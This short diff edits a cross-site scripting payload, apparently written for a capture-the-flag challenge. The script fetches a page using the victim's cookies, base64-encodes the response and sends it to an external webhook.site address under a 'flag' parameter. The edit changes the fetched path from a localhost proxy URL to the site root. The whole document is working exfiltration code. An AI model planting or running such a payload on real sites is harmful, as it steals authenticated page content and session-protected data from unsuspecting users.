@@ -1,5 +1,5 @@
 <script>
-fetch("/view?url=http://localhost/", { credentials: "include" })
+fetch("/", { credentials: "include" })
   .then(r => r.text())
   .then(t => fetch("https://webhook.site/c2ff2a84-4190-4e85-9627-372a769c9fe0/?flag=" + btoa(t)));
 </script>
